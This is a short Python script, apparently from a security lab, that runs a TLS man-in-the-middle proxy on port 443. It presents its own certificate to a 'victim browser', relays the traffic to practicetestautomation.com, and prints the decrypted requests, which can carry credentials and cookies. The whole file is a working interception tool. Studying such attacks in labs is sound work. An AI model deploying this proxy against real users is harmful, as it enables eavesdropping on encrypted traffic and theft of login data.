import socket
import ssl
import threading

HOST = '0.0.0.0'
PORT = 443

SERVER_CERT = './server-certs/server.crt'
SERVER_KEY = './server-certs/server.key'

REAL_HOSTNAME = 'practicetestautomation.com'
REAL_PORT = 443


# This side acts like a TLS server to the victim browser
context_srv = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context_srv.load_cert_chain(SERVER_CERT, SERVER_KEY)


def process_request(ssock_for_browser):
    try:
        # This side acts like a TLS client to the real website
        sock_for_server = socket.create_connection((REAL_HOSTNAME, REAL_PORT))

        context_cli = ssl.create_default_context()
        ssock_for_server = context_cli.wrap_socket(
            sock_for_server,
            server_hostname=REAL_HOSTNAME
        )

        # Read the browser request
        request = ssock_for_browser.recv(2048)

        if request:
            print("===== Browser Request =====")
            print(request.decode(errors='ignore'))
            # Forward browser request to real server
            ssock_for_server.sendall(request)

            # Forward real server response back to browser
            response = ssock_for_server.recv(2048)

            while response:
                ssock_for_browser.sendall(response)
                response = ssock_for_server.recv(2048)

        ssock_for_server.close()
        ssock_for_browser.shutdown(socket.SHUT_RDWR)
        ssock_for_browser.close()

    except Exception as e:
        print("Error:", e)


# Listen for HTTPS connections from browser
sock_listen = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock_listen.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock_listen.bind((HOST, PORT))
sock_listen.listen(5)

print("MITM HTTPS Proxy Running on port 443...")

while True:
    sock_for_browser, fromaddr = sock_listen.accept()

    ssock_for_browser = context_srv.wrap_socket(
        sock_for_browser,
        server_side=True
    )

    thread = threading.Thread(
        target=process_request,
         args=(ssock_for_browser,)
    )

    thread.start()